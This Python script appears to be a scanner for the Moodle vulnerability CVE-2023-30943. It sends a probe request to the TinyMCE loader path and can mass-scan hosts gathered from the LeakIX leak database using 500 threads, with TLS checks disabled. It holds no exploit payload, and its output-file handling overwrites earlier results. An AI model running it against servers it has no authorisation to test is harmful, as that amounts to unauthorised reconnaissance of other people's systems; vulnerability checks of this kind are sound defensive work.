import urllib3
import requests
import argparse
import concurrent.futures

from rich.console import Console
from alive_progress import alive_bar
from leakpy.scraper import LeakixScraper

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

def fetch_from_leakix(fields="protocol, host, port", bulk=False, pages=2):
    LEAKIX_API_KEY = "" # Configure this line with your LeakIX Pro API Key to use LeakPy

    if LEAKIX_API_KEY == "":
        console.print("[bold red]Please configure the Leakix API key.[/bold red]")
        exit(1)
    
    scraper = LeakixScraper(api_key=LEAKIX_API_KEY, verbose=True)
    
    results = scraper.execute(
        scope="leak",
        query='+plugin:MoodlePlugin',
        fields=fields,
        use_bulk=bulk,
    )

    url_dict = {}
    for result in results:
        protocol = result.get("protocol")
        host = result.get("host")
        port = result.get("port")
        url = f"{protocol}://{host}:{port}"
        url_dict[url] = None

    return list(url_dict.keys())

def mass_urls(urls, verbose, output_file=None):
    with alive_bar(len(urls), title='Processing URLs') as bar:
        with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
            futures = {executor.submit(fetch_data, url, verbose, output_file): url for url in urls}
            for future in concurrent.futures.as_completed(futures):
                bar()

def fetch_data(base_url, verbose=True, output_file=None):    
    target_url = f"{base_url}/lib/editor/tiny/loader.php?rev=abc&filepath=balgo.css"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }

    if verbose:
        console.print(f"[bold blue]Checking vulnerability at:[/bold blue] {target_url}")
    
    try:
        response = requests.get(target_url, headers=headers, verify=False, timeout=5)
        
        if response.status_code == 200 and not response.content:
            console.print(f"[bold green]{base_url} might be vulnerable to CVE-2023-30943![/bold green]")
            if output_file:
                with open(output_file, "w") as f:
                    f.write(f"Vulnerable target: {target_url}\n")
            return True
        else:
            if verbose:
                console.print("[bold red]Target does not seem to be vulnerable or something went wrong.[/bold red]")
            return False

    except requests.exceptions.RequestException:
        if verbose:
            console.print(f"[bold red]Connection Error...[/bold red]")
        return None

def main():
    parser = argparse.ArgumentParser(description="Tool to detect the CVE-2023-30943 vulnerability in Moodle.")
    parser.add_argument('-u', '--url', help="Base URL for the request")
    parser.add_argument('-f', '--file', help="File containing a list of URLs for mass scanning")
    parser.add_argument('-o', '--output', help="Output file to save vulnerable URLs and found sensitive keys")
    parser.add_argument('--leakpy', action='store_true', help="Use Leakix to fetch URLs based on leaks")
    parser.add_argument('--bulk', action='store_true', help="Use bulk_mode on LeakIX (Pro API Key only)")
    parser.add_argument('--pages', type=int, default=2, help="Page results on LeakIX")
    parser.add_argument('--verbose', action='store_true', help="Verbose mode")
    args = parser.parse_args()

    if args.leakpy:
        urls = fetch_from_leakix(bulk=args.bulk, pages=args.pages)
        mass_urls(urls, args.verbose, args.output)
    elif args.url:
        fetch_data(args.url, args.verbose, args.output)
    elif args.file:
        with open(args.file, "r") as file:
            urls = [line.strip() for line in file]
            mass_urls(urls, args.verbose, args.output)

if __name__ == "__main__":
    main()